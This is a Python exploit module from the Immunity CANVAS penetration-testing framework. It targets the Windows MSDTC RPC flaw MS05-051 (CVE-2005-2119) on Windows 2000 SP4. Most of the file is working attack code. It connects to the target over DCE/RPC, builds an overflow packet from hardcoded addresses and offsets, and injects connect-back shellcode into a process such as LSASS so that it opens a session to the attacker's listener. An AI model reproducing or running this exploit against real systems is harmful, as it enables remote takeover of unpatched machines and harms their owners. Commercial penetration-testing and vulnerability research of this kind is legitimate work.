#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation


import os
import getopt
import sys
import socket
import time

if "." not in sys.path: sys.path.append(".")

from exploitutils import *



from tcpexploit import tcpexploit
from msrpc import *


import canvasengine

# GUI info
NAME="msdtc MIDL_user_allocate bug (MS05-051)"
DESCRIPTION="msdtc MIDL_user_allocate bug"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"] = "10/11/2005"
#DOCUMENTATION["MS"]="MS05-051"
DOCUMENTATION["Platforms Tested"] = "Windows Server 2000 SP4 ENG"
DOCUMENTATION["CVE Name"] = "CVE-2005-2119"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2119"
DOCUMENTATION["MSRC"] = "http://www.microsoft.com/technet/security/Bulletin/MS05-051.mspx"

VERSION="0.1"

#affectsList=["Windows"]
PROPERTY = {}
#technically this is an Exploit but it's never going to be reliable
PROPERTY['TYPE'] = "DoS"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"]]
PROPERTY['VERSION'] = [ "2000" ]
PROPERTY['MSADV'] = "MS05-051"

GTK2_DIALOG="dialog.glade2"


CHANGELOG="""

"""
NOTES="""

IMPORTANT:
the following addresses are for msdtcprx.dll version 2000.2.3513.0

<noir> bp on 6dfd2a1b
<noir> add eax + 0x58 and replace it with 0x015a0058

and make sure 6dff91c4 is a pointer to NdrCall2 
RPC dispatch table tricks basically


msdtcprx.dll version 2000.2.3504.0

bp on 6df9007c


"""

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

# info, RPCDispatch_ptr, retadd (off by one)
targets = {
    0 : ["Autoversioning N/A", 0,0],
    1 : ["Windows 2000 SP4 msdtcprx.dll!2000.2.3513.0 hardware", 0x6dff91c4, 0x3d0058],
    2 : ["Windows 2000 SP4 msdtcprx.dll!2000.2.3513.0 vmware", 0x6dff91c4, 0x015a0058]
    #2 : ["Windows 2000 SP4 msdtcprx.dll!2000.2.3513.0 vmware", 0x6dff61c4, 0x01560058]
    #4 : ["Windows 2000 SP1", 0, 0],
}

# define these according to targets
WIN2K=1
from msrpcexploit import msrpcexploit

class theexploit(msrpcexploit):
    def __init__(self):
        self.name=NAME
        tcpexploit.__init__(self)
        self.supportedNodeArgs=[["LocalNode","linuxNode","win32Node"]]
        self.covertness = 0
        self.port = 0
        self.host = "192.168.0.6"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.version = 0
        self.badstring = "\x00\\/.:$"
        self.myDCE = None
        self.autoversion=0
        self.connectionList=[] #none to start, fill this in with buildConnectionList()
        self.subesp=0
        self.listenerArgsDict["fromcreatethread"] = 1
        self.name=NAME
        self.UUID="906b0ce0-c70b-1067-b317-00dd010662da"
        self.uuidversion="1.0"
        self.postactions=[("restart service",["MSDTC"])]
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        #on windows 2003 we actually trigger a heap overflow, so we'll use this 
        #for all of the exploits to prevent the heap corruption from disturbing us
        host=self.callback.ip
        port=self.callback.port
        #if smallcode is zero, then use fromcreatethread if running from commandline.
        # defaults to LSASS.EXE and lsass.exe
        self.shellcode=self.createHeapSafeInjectIntoProcess(self.badstring,host,port,smallcode=0)
        return self.shellcode
 
    def buildConnectionList(self):
        """
        Specify endpoints for the attack
        """

        if self.connectionList!=[]:
            return self.connectionList 

        if self.port==0:
            self.searchifids()                
        else:
            #user specified
            self.connectionList += ["ncacn_ip_tcp:%s[%d]"% (self.host,self.port)]
        return self.connectionList
    
    def connect(self):
        # connect DCE pipe
        connectionList =  self.buildConnectionList()

        self.myDCE = DCE(self.UUID, self.uuidversion, connectionList, covertness = self.covertness, getsock=self)
        self.myDCE.setUsername(self.user)
        self.myDCE.setPassword(self.password)

        try:
            map=self.myDCE.connect()
            if not map:
                self.raiseError("Could not connect to remote server - service is not running or the host is firewalled.")
        except DCEException, msg:
            self.log(msg)
            return 0
        self.log("attacking %s" % map)
        return 1

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.user=self.argsDict.get("user",self.user)
        self.password=self.argsDict.get("password",self.password)

        try:
            if self.connect():
                self.port=self.myDCE.port
                self.log("Found ms_dtc port: %d"%self.port)
                self.testOS()
                return 1
        except DCEException, msg:
            self.log("test failed: %s" % str(msg))
        return 0
    
    def testOS(self):
        """Sets the version properly, if possible"""
        return 0
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.user=self.argsDict.get("user",self.user)
        self.password=self.argsDict.get("password",self.password)        
        
        self.setInfo("%s attacking %s:%d - (in progress)"% (self.name, self.host, self.port), showlog=True)
        
        try:        
            self.connect()
            self.setProgress(25)
            pkt = self.buildDcePacket()
            self.myDCE.call(7, pkt, response=0)
            self.setProgress(50)
            time.sleep(2)
            
            self.connect()
            self.setProgress(75)
            pkt = self.buildDcePacket()
            self.myDCE.call(7, pkt, response=0)
        except self.error, msg:
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
            self.log("Failed reason: %s" % str(msg))
            return 0                       
        
        time.sleep(4)
        self.setProgress(100)
        
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name,self.host,self.port), showlog=True)
            self.log("%s done (succeeded!)"%self.name)
            return 1
            
        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), 
                     showlog=True)
        self.log("%s done (failed)"%self.name)
        return 0
            
            
    
    def buildDcePacket(self):
        """Build's our attack packet"""
        info, fptr, virtaddr = targets[self.version]
        pkt = ""
        data = ""            
        
        size = 0x400
        data = "\xcc"*(size*2)
        payload = "A"*12 + self.shellcode
        
        data = payload + (0x800 - len(payload)) * "C"
        
        self.log("len of payload %.8x data %.x" % (len(payload), len(data)))
        
        pkt += struct.pack("<L", 0x8a880000L)
        pkt += struct.pack("<L", 0x10)
        pkt += struct.pack("<L", 0x11)
        pkt += struct.pack("<L", 0x12)
        pkt += struct.pack("<L", 0x13)
        pkt += struct.pack("<L", 0x14)
        pkt += struct.pack("<L", 0x15)
        
        #unicode
        pkt += struct.pack("<L", 2)
        pkt += struct.pack("<L", 0)
        pkt += struct.pack("<L", 2)
        pkt += struct.pack("<L", 0x41)
        #unicode
        pkt += struct.pack("<L", 2)
        pkt += struct.pack("<L", 0)
        pkt += struct.pack("<L", 2)
        pkt += struct.pack("<L", 0x42)
        #unicode
        pkt += struct.pack("<L", 0x1)
        pkt += struct.pack("<L", 0)
        pkt += struct.pack("<L", 0x1)
        pkt += struct.pack("<L", 0x0)
        
        #ovf vector
        #let assume VirtualAlloc returns 0x015a0000
        #0x6dff91c4 --> opcode:7 
        
        #
        offset = ((fptr - virtaddr - 4)/2)

        #hardware
        #offset = ((0x6dff91c4 - 0x3d0058 - 4)/2)
        #self.log("offset calculated: %.8x" % offset)
        
        pkt += struct.pack("<L", offset)
        pkt += struct.pack("<L", 0x0)
        pkt += struct.pack("<L", size+1)
        pkt += data
        pkt += struct.pack("<L", 0)
        
        #unicode        
        pkt += struct.pack("<L", 8)
        pkt += struct.pack("<L", 0)
        pkt += struct.pack("<L", 8)
        pkt += "\xcc\xcc\xcc\xcc"
        
        #ptr
        pkt += struct.pack("<L", 0x12fe08)
        pkt += "\xcc"*4
        
        pkt += struct.pack("<L", 0x21)
        pkt += struct.pack("<L", 0x21)
        pkt += struct.pack("<L", 0x22)
        pkt += struct.pack("<L", 0x23)
        pkt += struct.pack("<L", 0x24)
        pkt += struct.pack("<L", 0)        
        pkt += struct.pack("<L", 0)        
        
        return pkt

    def usage(self):
            print "Usage: %s -v version -t host -l localIP -d localPort (connectback) [-T: testmode]"% sys.argv[0]
            print "NOTE!!!!! - if using commandlineInterface.py, you must use -i fromcreatethread . "
            
            i = 0
            print "Available versions:"
            for listline in targets.values():
                print "\t%d : %s"% (i, listline[0])
                i = i + 1
            sys.exit(0)
    
if __name__== '__main__':
    app = theexploit()
    app.port = 0
    ret=standard_callback_commandline(app)


    
